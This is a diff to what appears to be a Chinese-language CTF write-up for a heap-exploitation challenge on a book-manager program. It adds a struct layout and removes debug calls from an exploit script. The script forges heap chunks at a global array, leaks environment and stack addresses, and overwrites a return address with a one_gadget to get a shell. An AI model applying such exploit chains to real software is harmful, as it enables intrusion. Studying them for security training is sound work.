@@ -58,7 +58,7 @@ int add_book()
   if ( HIDWORD(size) == 16 )
     puts("Too many books");
   puts("What is the author name?");
-  readn(40LL * HIDWORD(size) + 0x602060, 0x1F);
+  readn(40LL * HIDWORD(size) + 0x602060, 31);
   puts("How long is the book name?");
   _isoc99_scanf("%u", &size);
   if ( (unsigned int)size > 0x50 )
@@ -69,6 +69,18 @@ int add_book()
   return puts("Done!");
 }
 ```
+分析出一个结构体：
+
+```c
+struct book{
+
+char author[30] ;
+char nop[2];    // 0 填充
+char *bookname; 
+
+}
+```
+
 ## 删除功能
 
 ```c
@@ -214,7 +226,6 @@ add("a",0x20,"bbbbbbb")  # 7
 dele(5)
 dele(6)
 add("d",0,p64(0)*3+p64(0x31)+p64(0x602060))
-#g(p)
 add("f",0x20,"s")
 add("Z",0x20,p64(0)*2+p64(env))  # 8
 show(0)
@@ -233,7 +244,6 @@ dele(10)
 
 add("s",0,p64(0)*3+p64(0x31)+p64(stack))
 add("B",0x20,"2"*0x10)
-g(p)
 add("h",0x20,p64(0)+p64(0)+p64(one_gadget)) 
 
 ### 退出 ，getshell
